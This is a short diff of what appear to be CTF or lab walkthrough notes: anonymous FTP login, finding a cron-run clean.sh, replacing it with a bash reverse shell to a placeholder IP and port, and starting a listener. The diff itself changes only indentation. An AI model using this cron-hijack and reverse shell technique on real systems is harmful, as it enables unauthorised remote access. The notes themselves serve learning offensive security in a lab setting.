@@ -3,7 +3,7 @@ ftp anon login
 found clean.sh that is being rn as a cron job
 
   replace the clean.sh w/ 
-              #!/bin/bash
+             #!/bin/bash
              bash -i >& /dev/tcp/[Your-IP-Address]/[PORT] 0>&1
 
   set listnener on attacker computer
